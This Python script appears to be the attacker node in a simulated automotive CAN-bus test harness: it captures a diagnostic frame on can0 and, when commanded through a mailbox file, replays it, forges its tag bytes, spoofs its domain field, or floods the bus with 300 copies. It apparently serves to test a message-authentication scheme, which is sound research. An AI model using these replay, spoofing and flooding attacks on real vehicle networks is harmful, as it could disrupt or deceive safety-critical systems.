"""Unenrolled adversary. Only powertrain CAN and its own command mailbox mounted."""
import json
from pathlib import Path
import socket
import time
from common import *


def main():
    log = Log('attacker')
    wait_interface('can0')
    can = CAN('can0', log, 1)
    last_command, captured = None, None
    log.event('ready', domain=1, credentials='NONE')
    while True:
        try:
            item = can.recv(.02)
            if item and item[0] == DIAGNOSTIC:
                captured = item[1]
                log.event('diagnostic_captured', domain=1)
        except socket.timeout:
            pass
        path = Path('/mailbox/command.json')
        if not path.exists():
            continue
        command = json.loads(path.read_text())
        if command['id'] == last_command:
            continue
        last_command = command['id']
        log.run_id = command['run_id']
        if captured is None:
            atomic('/mailbox/result.json', dict(id=last_command, error='No authentic diagnostic captured'))
            continue
        mode = command['attack']
        packet = bytearray(captured)
        count = 1
        if mode == 'forged_tag':
            packet[4:8] = (int.from_bytes(packet[4:8],'big')+1).to_bytes(4,'big')
            packet[8] ^= 1
        elif mode == 'spoof_domain':
            packet[2] = 2
        elif mode == 'flood':
            count = 300
        elif mode != 'replay':
            atomic('/mailbox/result.json', dict(id=last_command, error='Unknown attack'))
            continue
        log.event('attack_started', domain=1, attack=mode, count=count)
        for _ in range(count):
            can.send(DIAGNOSTIC, bytes(packet), attack=mode)
            if count > 1:
                time.sleep(.001)
        log.event('attack_finished', domain=1, attack=mode, count=count)
        atomic('/mailbox/result.json', dict(id=last_command, transmitted=count))


if __name__ == '__main__':
    main()
